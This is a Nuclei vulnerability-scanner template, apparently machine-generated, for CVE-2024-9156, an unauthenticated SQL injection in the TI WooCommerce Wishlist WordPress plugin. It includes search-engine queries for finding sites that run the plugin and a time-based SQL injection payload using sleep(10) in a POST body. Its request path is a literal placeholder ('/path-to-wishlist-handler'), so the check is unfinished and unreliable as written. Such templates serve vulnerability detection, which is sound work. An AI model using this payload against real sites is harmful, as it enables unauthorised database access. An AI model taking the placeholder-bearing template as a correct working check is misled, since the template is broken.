id: CVE-2024-9156

info:
  name: Unauthenticated SQL Injection in TI WooCommerce Wishlist Plugin
  author: ProjectDiscoveryAI
  severity: high
  description: |
    The TI WooCommerce Wishlist WordPress plugin through 2.8.2 is vulnerable to SQL Injection due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.
  impact: |
    Allows unauthenticated attackers to execute malicious SQL queries
  remediation: |
    Update TI WooCommerce Wishlist Plugin to the latest version to mitigate the SQL Injection vulnerability
  reference:
    - https://wpscan.com/vulnerability/e95974f9-1f68-4181-89b0-3559d61cfa93/
    - https://github.com/20142995/nuclei-templates
    - https://github.com/cyb3r-w0lf/nuclei-template-collection
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2024-9156
    cwe-id: CWE-89
    epss-score: 0.00084
    epss-percentile: 0.37299
    cpe: cpe:2.3:a:templateinvaders:ti_woocommerce_wishlist:*:*:*:*:free:wordpress:*:*
  metadata:
    vendor: templateinvaders
    product: ti_woocommerce_wishlist
    framework: wordpress
    shodan-query: http.html:"/wp-content/plugins/ti-woocommerce-wishlist/"
    fofa-query: body="/wp-content/plugins/ti-woocommerce-wishlist/"
    publicwww-query: /wp-content/plugins/ti-woocommerce-wishlist/
  tags: wpscan

http:
  - method: POST
    path:
      - "{{BaseURL}}/path-to-wishlist-handler"

    body: |
      lang=%5C&lang_default=,0) OR t.language_code=sleep(10)--+

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: dsl
        dsl:
          - "duration>=6"
